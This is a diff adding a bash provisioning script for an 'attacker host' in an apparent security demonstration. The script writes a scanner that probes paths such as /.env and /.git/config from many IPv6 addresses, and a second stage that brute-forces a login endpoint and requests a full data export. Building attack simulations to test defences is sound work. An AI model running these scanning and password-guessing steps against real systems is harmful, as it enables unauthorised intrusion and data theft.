@@ -1,0 +1,78 @@
+#!/bin/bash
+# Attacker host. Writes the traffic generator; runs nothing. The demo is started by an SSM command from .github/workflows/agent-warden.yml.
+#
+# Amazon Linux 2023 already ships curl, aws, jq and dig, so this installs
+# nothing. An earlier version ran "dnf install -y curl", which conflicts with
+# the preinstalled curl-minimal; under set -e that aborted user-data before it
+# had written anything, and the failure was invisible until a demo command
+# found no script to run.
+#
+# Two rules follow from that, and both are worth keeping:
+#   1. Install nothing that is already present.
+#   2. Write the payload FIRST, so that anything which fails later cannot
+#      leave the host without its scripts.
+set -uo pipefail
+
+cat > /opt/stage1.sh <<'STAGE1'
+#!/bin/bash
+# Stage 1: low-grade scanning from every IPv6 address bound to this host.
+#
+# curl --interface <addr> makes the kernel source the connection from that
+# address, so each request genuinely originates from a different AWS-allocated
+# IPv6 address. Nothing is spoofed.
+set -uo pipefail
+
+TARGETS="${target_a} ${target_b}"
+PATHS="/admin /wp-login.php /.env /api/v1/login /phpmyadmin /.git/config"
+
+ADDRS=$(ip -6 -o addr show scope global | awk '{print $4}' | cut -d/ -f1)
+echo "sourcing from $(echo "$ADDRS" | wc -l) addresses"
+
+for round in $(seq 1 "$${1:-6}"); do
+  for addr in $ADDRS; do
+    for p in $PATHS; do
+      for t in $TARGETS; do
+        curl -6 -s -o /dev/null --max-time 4 \
+          --interface "$addr" \
+          -H 'User-Agent: Mozilla/5.0 (compatible; scanner)' \
+          "http://$t$p" || true
+      done
+    done
+  done
+  echo "round $round complete"
+done
+STAGE1
+
+cat > /opt/stage2.sh <<'STAGE2'
+#!/bin/bash
+# Stage 2: the real attack, from a single address the defenders have never
+# seen, after stage 1 has done its work.
+#
+# On the Warden-A side the responders are watching and this is caught. On the
+# Warden-B side nobody can reach the application to look.
+set -uo pipefail
+
+TARGETS="${target_a} ${target_b}"
+ADDR=$(ip -6 -o addr show scope global | awk '{print $4}' | cut -d/ -f1 | tail -1)
+
+for t in $TARGETS; do
+  for i in $(seq 1 40); do
+    curl -6 -s -o /dev/null --max-time 4 --interface "$ADDR" \
+      -X POST -d "user=admin&pass=trythis$i" \
+      -H 'User-Agent: Mozilla/5.0' \
+      "http://$t/api/v1/login" || true
+  done
+  curl -6 -s -o /dev/null --max-time 8 --interface "$ADDR" \
+    "http://$t/api/v1/export?all=true" || true
+done
+echo "stage 2 complete from $ADDR"
+STAGE2
+
+chmod +x /opt/stage1.sh /opt/stage2.sh
+
+# Prove the host can do what the demo will ask of it, while there is still
+# someone watching the log.
+{
+  echo "addresses: $(ip -6 -o addr show scope global | wc -l)"
+  echo "curl     : $(command -v curl || echo MISSING)"
+} > /var/log/cosac-ready.log 2>&1
